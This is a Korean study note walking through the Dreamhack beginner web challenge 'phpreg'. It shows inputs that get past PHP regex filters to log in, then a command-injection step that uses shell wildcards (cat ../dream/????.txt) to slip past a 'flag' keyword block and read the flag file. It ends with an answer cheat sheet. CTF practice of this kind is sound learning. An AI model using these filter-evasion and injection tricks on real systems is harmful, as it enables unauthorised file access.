# phpreg (#873)

- 링크: https://dreamhack.io/wargame/challenges/873
- 카테고리: Web / Beginner
- 강의 연계: [정규표현식 #461](https://learn.dreamhack.io/461), 직전 문제 [ex-reg-ex #834](https://dreamhack.io/wargame/challenges/834)
- 공부 로그: `log_for_study/2026-08-04.md`

## 한 줄 요약

PHP 정규식 필터를 우회해 로그인(Step 1) → `system()` 으로 `flag` 단어 없이 플래그 파일 읽기(Step 2).

## 파일

| 파일 | 설명 |
|------|------|
| `index.php` | Step 1 폼 등 |
| `step2.php` | **핵심** — 필터 + 로그인 조건 + `system()` |
| `original.zip` | 드림핵 원본 |
| `README.md` | 이 메모 |

PHP는 **텍스트**라 VS Code / 메모장으로 열면 됨. 로컬 실행 불필요 — 소스로 조건만 읽고 **드림핵 서버**에서 풀이.

## 정석 풀이 순서

1. `step2.php` 열어서 필터·목표 문자열 확인  
2. 서버 생성 → 브라우저 접속  
3. Step 1: 우회 nickname / password 입력  
4. Step 2 Command: 와일드카드로 flag 읽기  
5. `DH{...}` 제출  

---

## Step 1 — Nickname / Password 어떻게 확인?

`step2.php` 안의 **최종 조건**이 목표:

```php
if ($name === "dnyang0310" && $pw === "d4y0r50ng+1+13")
```

그 **위**에 필터가 있어서 그대로 치면 실패.

### Nickname

```php
$name = preg_replace("/nyang/i", "", $input_name);
```

| 입력 | 결과 |
|------|------|
| `dnyang0310` | `nyang` 삭제 → `d0310` ❌ |
| `dnnyangyang0310` | `nyang` 삭제 → `dnyang0310` ✅ |

**입력:** `dnnyangyang0310`

### Password

1. 영문 있으면 거부: `preg_match("/[a-zA-Z]/", $input_pw)`  
2. 패턴을 `d4y0r50ng` 로 치환:

```php
preg_replace("/\d*\@\d{2,3}(31)+[^0-8\"]\!/", "d4y0r50ng", $input_pw);
```

| 조각 | 의미 | 예 |
|------|------|-----|
| `\d*` | 숫자 0개 이상 | `0` |
| `\@` | `@` | `@` |
| `\d{2,3}` | 숫자 2~3개 | `123` |
| `(31)+` | `31` 반복 | `31` |
| `[^0-8"]` | 0~8·`"` 제외 1글자 | `9` |
| `\!` | `!` | `!` |

`0@12319!` → `d4y0r50ng`  
최종 목표 `d4y0r50ng+1+13` 이므로:

**입력:** `0@12319!+1+13`

### Step 1 제출값

| 필드 | 값 |
|------|-----|
| Nickname | `dnnyangyang0310` |
| Password | `0@12319!+1+13` |

---

## Step 2 — Command에 뭐 입력?

```php
if (preg_match("/flag/i", $cmd)) {
  echo "Error!";
} else {
  system($cmd);
}
```

플래그 경로: `../dream/flag.txt`  
명령에 `flag` 글자 넣으면 차단.

**Command 예시:**

```text
cat ../dream/????.txt
```

또는

```text
cat ../dream/*
```

`?` = 셸 와일드카드(문자 1개) → `flag` 네 글자를 글자 없이 지정.

목록만: `ls ../dream`

---

## 한 줄 치트시트

```text
Nickname: dnnyangyang0310
Password: 0@12319!+1+13
Command:  cat ../dream/????.txt
```
